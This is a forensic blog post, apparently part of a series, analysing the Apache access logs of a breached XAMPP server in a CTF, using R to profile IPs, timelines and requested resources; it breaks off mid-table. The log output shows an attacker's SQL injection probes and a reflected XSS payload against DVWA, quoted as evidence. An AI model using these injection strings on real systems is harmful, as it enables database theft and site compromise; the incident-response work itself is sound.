This is one of many posts in a series I’ll be doing on [a
CTF](https://www.ashemery.com/dfir.html#Challenge1) offered by [Ali
Hadi](https://twitter.com/binaryz0ne). The CTF looks at a web server
breach and asks us to answer several questions in order to complete the
challenge. In an effort to avoid an incredibly long blog post, I’ll be
breaking this up by question, with some questions potentially taking
more than one post. You can find the chronological list of posts below,
which will be updated as more posts are added.

1.  [Analyzing the SAM Hive and security events
    Log](https://tibblesnbits.com/posts/investigating-web-server-breach-part-i)  
2.  [Analyzing the web server
    logs](https://tibblesnbits.com/posts/investigating-web-server-breach-part-ii)

## Assumptions

Before jumping in, there are a couple of assumptions I’m going to make
about you as the reader:

-   You’re interested in understanding how this analysis would look on a
    Windows machine.  
-   You’re comfortable reading code used to conduct analyses.  
-   You’re familiar with log files and the data often contained within.

If any of these are completely foreign to you, I would pause here and
spend some time familiarizing yourself with those concepts.

## Recap

In [the last blog
post](https://tibblesnbits.com/posts/investigating-web-server-breach-part-i),
we started looking at the SAM Hive and Windows Security Event Log in an
effort to answer the question “how many users have been added to the box
and how”. We were able to identify that at least two users,
`user1 (1005)` and `hacker (1006)`, were added to the machine on
September 2nd, 2015 at approximately 9:05 am PST. However, when we went
to look for the security events with event ID 4720, we found what
appeared to be suspicious activity in the logs. The thing that stood out
was an approximately 19 hour gap in the logs on the day that the users
were added; a byproduct of what appears to be `VBoxService.exe` changing
the system time on the machine. We also saw that this file didn’t seem
to exist on the disk image, which increases the suspiciousness.

## The Question

I dug a little deeper into the `VBoxService.exe` oddities, but wasn’t
able to determine anything other than the fact that we can find it in
the memory dump. There’s going to be additional blog posts in which we
examine `memdump.mem`, so I’ll hold off on showing how I was able to
extract the file until we get there. For now, I’d like to keep working
with data that we can find on the disk image, which brings us to today’s
focal point: the web server logs. I’m not sure if it’ll help us identify
*how* the users were added to the machine, but it should give us some
indication of how the attacker(s) interacted with the web server, which
could give us leads as to where to look next. So, let’s start with a
couple initial questions to get us started.

**1. What IPs interacted with our box on September 2nd?**  
**2. What do the logs show around the time the users were added?**  
**3. Do the logs provide any additional leads for where to look next?**

## The Analysis

Let’s start by loading the log file, which, as you may recall, was
stored in `%SystemRoot$\xampp\apache\logs\access.log`. I’ll be using
[R](https://www.r-project.org/about.html) and its
[tidyverse](https://www.tidyverse.org/) set of packages to analyze the
data. If you’re familiar with Python and Pandas, you should be able to
understand this code quite intuitively, but even if you’re not familiar
with code at all it should still be relatively straightforward. I’ll do
my best to explain any code snippets that I feel are not intuitively
understandable from the code itself.

Let’s start by getting a feel for what the logs even look like so we can
try to understand how to parse them.

    head -n 3 xampp-apache-access.log

    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"
    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET /dashboard/ HTTP/1.1" 200 7327 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"
    ::1 - - [23/Aug/2015:14:46:24 -0700] "GET /dashboard/stylesheets/normalize.css HTTP/1.1" 200 6876 "http://localhost/dashboard/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"

Feels like a pretty typical log file, namely the fact that there’s no
header indicating what each “field” represents. Thankfully, the Internet
can sometimes be a magical place. If we Google for “xampp access log
format”, we’ll come across this nice
[resource](https://www.sumologic.com/blog/apache-access-log/) that
explains it all to us. Let’s use that to ingest and parse the logs

    library(tidyverse) |>
        suppressPackageStartupMessages() |>
        suppressWarnings()

    raw <- read_log("xampp-apache-access.log", show_col_types=FALSE)
    colnames(raw) <- c(
        "ip",
        "client_identity",
        "user_id",
        "timestamp",
        "method_resource_version",
        "status_code",
        "size",
        "referer",
        "user_agent"
    )

    head(raw)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["client_identity"],"name":[2],"type":["lgl"],"align":["right"]},{"label":["user_id"],"name":[3],"type":["lgl"],"align":["right"]},{"label":["timestamp"],"name":[4],"type":["chr"],"align":["left"]},{"label":["method_resource_version"],"name":[5],"type":["chr"],"align":["left"]},{"label":["status_code"],"name":[6],"type":["dbl"],"align":["right"]},{"label":["size"],"name":[7],"type":["dbl"],"align":["right"]},{"label":["referer"],"name":[8],"type":["chr"],"align":["left"]},{"label":["user_agent"],"name":[9],"type":["chr"],"align":["left"]}],"data":[{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:24 -0700","5":"GET / HTTP/1.1","6":"302","7":"NA","8":"NA","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:24 -0700","5":"GET /dashboard/ HTTP/1.1","6":"200","7":"7327","8":"NA","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:24 -0700","5":"GET /dashboard/stylesheets/normalize.css HTTP/1.1","6":"200","7":"6876","8":"http://localhost/dashboard/","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:24 -0700","5":"GET /dashboard/javascripts/modernizr.js HTTP/1.1","6":"200","7":"51365","8":"http://localhost/dashboard/","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:24 -0700","5":"GET /dashboard/stylesheets/all.css HTTP/1.1","6":"200","7":"472137","8":"http://localhost/dashboard/","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"NA","3":"NA","4":"23/Aug/2015:14:46:25 -0700","5":"GET /dashboard/images/xampp-logo.svg HTTP/1.1","6":"200","7":"5427","8":"http://localhost/dashboard/","9":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

The `read_log` function does a pretty good job of automatically parsing
the fields, but I’d like to clean the data up a little more, including
getting rid of what appears to be a couple empty columns. Let’s confirm
that there’s no data in `client_identity` and `user_id`. Note that the
`|>` is R’s pipe operator, akin to `|` in Bash.

    raw |>
        count(client_identity, user_id, sort=TRUE)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["client_identity"],"name":[1],"type":["lgl"],"align":["right"]},{"label":["user_id"],"name":[2],"type":["lgl"],"align":["right"]},{"label":["n"],"name":[3],"type":["int"],"align":["right"]}],"data":[{"1":"NA","2":"NA","3":"7716"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

As expected, there’s no data in those two columns, so we’ll drop them.

    processed <- raw |>
        select(-client_identity, -user_id) |>
        separate(timestamp, into=c("date", "time"), sep=":", extra="merge") |>
        separate(method_resource_version, into=c("method", "resource", "http_version"), sep=" ") |>
        mutate(date=parse_date(date, format="%d/%b/%Y"))

    head(processed)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["date"],"name":[2],"type":["date"],"align":["right"]},{"label":["time"],"name":[3],"type":["chr"],"align":["left"]},{"label":["method"],"name":[4],"type":["chr"],"align":["left"]},{"label":["resource"],"name":[5],"type":["chr"],"align":["left"]},{"label":["http_version"],"name":[6],"type":["chr"],"align":["left"]},{"label":["status_code"],"name":[7],"type":["dbl"],"align":["right"]},{"label":["size"],"name":[8],"type":["dbl"],"align":["right"]},{"label":["referer"],"name":[9],"type":["chr"],"align":["left"]},{"label":["user_agent"],"name":[10],"type":["chr"],"align":["left"]}],"data":[{"1":"::1","2":"2015-08-23","3":"14:46:24 -0700","4":"GET","5":"/","6":"HTTP/1.1","7":"302","8":"NA","9":"NA","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"2015-08-23","3":"14:46:24 -0700","4":"GET","5":"/dashboard/","6":"HTTP/1.1","7":"200","8":"7327","9":"NA","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"2015-08-23","3":"14:46:24 -0700","4":"GET","5":"/dashboard/stylesheets/normalize.css","6":"HTTP/1.1","7":"200","8":"6876","9":"http://localhost/dashboard/","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"2015-08-23","3":"14:46:24 -0700","4":"GET","5":"/dashboard/javascripts/modernizr.js","6":"HTTP/1.1","7":"200","8":"51365","9":"http://localhost/dashboard/","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"2015-08-23","3":"14:46:24 -0700","4":"GET","5":"/dashboard/stylesheets/all.css","6":"HTTP/1.1","7":"200","8":"472137","9":"http://localhost/dashboard/","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"},{"1":"::1","2":"2015-08-23","3":"14:46:25 -0700","4":"GET","5":"/dashboard/images/xampp-logo.svg","6":"HTTP/1.1","7":"200","8":"5427","9":"http://localhost/dashboard/","10":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Much better. Now we can do some exploratory analyses, such as getting
the top 10 IPs that have interacted with this box, the earliest and
latest dates for which we have data, a count of activity by date, and
more. Let’s start with getting the date range for our logs.

    processed |>
        mutate(
            start_date = min(date) |> format("%Y-%m-%d"),
            end_date = max(date) |> format("%Y-%m-%d")
        ) |>
        select(start_date, end_date) |>
        slice(1)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["start_date"],"name":[1],"type":["chr"],"align":["left"]},{"label":["end_date"],"name":[2],"type":["chr"],"align":["left"]}],"data":[{"1":"2015-08-23","2":"2015-09-03"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

I assume that the short time window in the logs is because this is a CTF
and not a real-world event. In a real event, we’d likely have a *much*
larger file, with many more dates to comb through. However, the
approaches we’re using here should work in those scenarios as well, as
long as our analyses are targeted and specific. Let’s see what the top
10 IPs hitting this box are. If we don’t see anything of interest, we
can narrow that down to the top 10 IPs the day the users were added.

    processed |>
        count(ip, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"192.168.56.102","2":"4398"},{"1":"10.20.0.72","2":"461"},{"1":"10.20.0.54","2":"316"},{"1":"10.20.0.65","2":"302"},{"1":"10.20.0.58","2":"301"},{"1":"10.20.0.61","2":"301"},{"1":"10.20.0.62","2":"300"},{"1":"10.20.0.63","2":"300"},{"1":"10.20.0.66","2":"300"},{"1":"10.20.0.68","2":"300"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Wow, okay, so `192.168.56.102` has hit the box 4,398 times, which is
almost 10x more than the next IP. Now, we know that any `192.168.0.0/16`
IPs are going to be internal, private IPs, so this obviously isn’t the
IP of our attacker, but it’s still interesting and worth digging into.
Let’s see if that IP interacted with our server on September 2nd.

    processed |>
        filter(date == "2015-09-02") |>
        count(ip, sort=TRUE)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"192.168.56.102","2":"4319"},{"1":"::1","2":"30"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Not only did that IP interact with the server on that date, it was
virtually the *only* IP that interacted with the server. I want to see
two things. First, a timeline of activity for that day and this IP, and
second a breakdown of the resources that were requested. Let’s start
with the timeline of activity.

    plot_data <- processed |>
        filter(date == "2015-09-02") |>
        filter(ip == "192.168.56.102") |>
        mutate(time = str_remove(time, " -.*")) |>
        unite(datetime, date, time, sep=" ") |>
        mutate(datetime=lubridate::ymd_hms(datetime)) |>
        count(datetime)

    ggplot(plot_data, aes(x=datetime, y=n)) +
        geom_line() +
        scale_x_datetime(date_labels="%H:%M") +
        xlab("Time") +
        ylab("Number of Events") +
        ggtitle("Access Events for 192.168.56.102 on Sep 2nd, 2015") +
        theme(
            panel.background=element_blank(),
            axis.line=element_line(color="black")
        )

![](0001-01-07-investigating-web-server-breach-part-ii_files/figure-markdown_strict/timeseries-1.png)

This seems to indicate that our attacker is active pretty early in the
morning, with virtually all events taking place before 06:00 Pacific
Time. Let’s just confirm real quick that our analysis is right and that
the graph is accurately showing us the data.

    processed |>
        filter(ip == "192.168.56.102" & date == "2015-09-02" & time > "06:00:00") |>
        arrange(time) |>
        slice(1, n()) |>
        select(ip, date, time)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["ip"],"name":[1],"type":["chr"],"align":["left"]},{"label":["date"],"name":[2],"type":["date"],"align":["right"]},{"label":["time"],"name":[3],"type":["chr"],"align":["left"]}],"data":[{"1":"192.168.56.102","2":"2015-09-02","3":"23:20:00 -0700"},{"1":"192.168.56.102","2":"2015-09-02","3":"23:59:38 -0700"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

The code above takes our data and filters down to our data of interest,
sorts by time, and then gets the first and last rows from the data so
that we can see the timestamps for that activity. As the data shows, our
attacker didn’t interact with the web server between 06:00 and 23:20.
But they were *very* active prior to that, with over 90 events coming in
at some points. Let’s look at what some of those requests look like.
Let’s also create a new dataset that only contains the data for this IP
and the day of interest.

    suspicious_activity <- processed |>
        filter(ip == "192.168.56.102" & date == "2015-09-02")

    suspicious_activity |>
        count(resource, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["resource"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"/dvwa/login.php","2":"1407"},{"1":"/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit","2":"44"},{"1":"/dvwa/vulnerabilities/exec/","2":"32"},{"1":"/dvwa/setup.php","2":"17"},{"1":"/dvwa/security.php","2":"15"},{"1":"/dvwa/vulnerabilities/xss_s/","2":"13"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201--%20&Submit=Submit","2":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201%23&Submit=Submit","2":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL--%20&Submit=Submit","2":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit","2":"8"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Well isn’t **that** interesting?! What is “dvwa”? More importantly, look
at those explicit SQL injection calls! All right, all right, let’s stay
cool and keep our wits about us. We need to figure out what’s going on
here. Let’s start by trying to figure out what “dvwa” is. A quick Google
search tells us that it’s potentially the [Damn Vulnerable Web
App](https://github.com/digininja/DVWA), which would be interesting and
fitting for this CTF. Additionally, if we read further down on the
GitHub repo, under the “WARNING!” label, we see that the author
recommends installing XAMPP for the web server and database, which is
what we see on this machine. There are a few more analyses I want to run
on these logs, but I think my next step is to learn more about the DVWA
and see how that fits into our story here. But for now, let’s see what
the `referer` data tells us as it relates to these resource requests.

    suspicious_activity |>
        count(resource, referer, sort=TRUE) |>
        head(10)

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["resource"],"name":[1],"type":["chr"],"align":["left"]},{"label":["referer"],"name":[2],"type":["chr"],"align":["left"]},{"label":["n"],"name":[3],"type":["int"],"align":["right"]}],"data":[{"1":"/dvwa/login.php","2":"NA","3":"1405"},{"1":"/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit","2":"NA","3":"43"},{"1":"/dvwa/vulnerabilities/exec/","2":"http://192.168.56.101/dvwa/vulnerabilities/exec/","3":"24"},{"1":"/dvwa/setup.php","2":"http://192.168.56.101/dvwa/setup.php","3":"11"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201--%20&Submit=Submit","2":"NA","3":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20ORDER%20BY%201%23&Submit=Submit","2":"NA","3":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL--%20&Submit=Submit","2":"NA","3":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%23&Submit=Submit","2":"NA","3":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20&Submit=Submit","2":"NA","3":"8"},{"1":"/dvwa/vulnerabilities/sqli/?id=2%20UNION%20ALL%20SELECT%20NULL%2CNULL%23&Submit=Submit","2":"NA","3":"8"}],"options":{"columns":{"min":{},"max":[10]},"rows":{"min":[10],"max":[10]},"pages":{}}}
  </script>

Not as helpful as I was hoping. Let’s just get a quick count of the
`referer` field.

    suspicious_activity |>
        count(referer, sort=TRUE) 

<script data-pagedtable-source type="application/json">
{"columns":[{"label":["referer"],"name":[1],"type":["chr"],"align":["left"]},{"label":["n"],"name":[2],"type":["int"],"align":["right"]}],"data":[{"1":"NA","2":"3736"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/exec/","2":"32"},{"1":"http://192.168.56.101/dashboard/docs/","2":"28"},{"1":"http://192.168.56.101/dashboard/","2":"24"},{"1":"http://192.168.56.101/dvwa/index.php","2":"20"},{"1":"http://192.168.56.101/dashboard/docs/images/","2":"19"},{"1":"http://192.168.56.101/dvwa/setup.php","2":"17"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/","2":"17"},{"1":"http://192.168.56.101/dashboard/images/","2":"16"},{"1":"http://192.168.56.101/dvwa/security.php","2":"16"},{"1":"http://192.168.56.101/dashboard/howto.html","2":"15"},{"1":"http://192.168.56.101/dvwa/dvwa/","2":"10"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_s/","2":"10"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/","2":"8"},{"1":"http://192.168.56.101/dvwa/dvwa/css/","2":"7"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/DBMS/","2":"7"},{"1":"http://192.168.56.101/dvwa/login.php","2":"7"},{"1":"http://192.168.56.101/dashboard/stylesheets/","2":"6"},{"1":"http://192.168.56.101/icons/","2":"6"},{"1":"http://192.168.56.101/dvwa/dvwa/js/","2":"5"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit","2":"5"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/","2":"5"},{"1":"http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-vhosts/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/deploy-git-app/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/install-wordpress/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/reset-mysql-password/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/send-mail/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/use-different-php-version/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/use-php-fcgi/","2":"4"},{"1":"http://192.168.56.101/dashboard/docs/images/use-sqlite/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/addons/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/blog/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/flags/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/screenshots/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/stamps/","2":"4"},{"1":"http://192.168.56.101/dashboard/images/team/","2":"4"},{"1":"http://192.168.56.101/dashboard/javascripts/","2":"4"},{"1":"http://192.168.56.101/dvwa/dvwa/images/","2":"4"},{"1":"http://192.168.56.101/dvwa/instructions.php","2":"4"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+union+select+user%28%29%2C+database%28%29+--+&Submit=Submit","2":"4"},{"1":"http://192.168.56.101/icons/small/","2":"4"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=a%27+or+%271%27+%3D+%271&Submit=Submit","2":"3"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=S;O=A","2":"2"},{"1":"http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=D;O=A","2":"2"},{"1":"http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=M;O=A","2":"2"},{"1":"http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=M;O=A","2":"2"},{"1":"http://192.168.56.101/dashboard/stylesheets/all.css","2":"2"},{"1":"http://192.168.56.101/dvwa/dvwa/includes/?C=S;O=A","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/brute/.","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=abc%27+and+0%3D0+union+select+table_name%2C+null+from+information_schema.tables+where+table_name+like+%22user%25%22--+&Submit=Submit","2":"2"},{"1":"http://192.168.56.101/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E","2":"2"},{"1":"http://192.168.56.101/icons/?C=S;O=A","2":"2"},{"1":"http://192.168.56.101/","2":"1"},{"1":"http://192.168.56.101/applications.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/backup-restore-mysql.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/configure-vhosts.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/configure-wildcard-subdomains.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/deploy-git-app.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/activate-use-xdebug/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/backup-restore-mysql/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-vhosts/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/configure-wildcard-subdomains/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf1/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/create-framework-project-zf2/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/deploy-git-app/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/install-wordpress/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/reset-mysql-password/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/send-mail/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/send-mail/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/send-mail/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/send-mail/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/transfer-files-ftp/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/troubleshoot-apache/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-different-php-version/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-php-fcgi/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=D;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=M;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=N;O=D","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/images/use-sqlite/?C=S;O=A","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/install-wordpress.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/send-mail.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/transfer-files-ftp.html","2":"1"},{"1":"http://192.168.56.101/dashboard/docs/use-sqlite.html","2":"1"},{"1":"http://192.168.56.101/dashboard/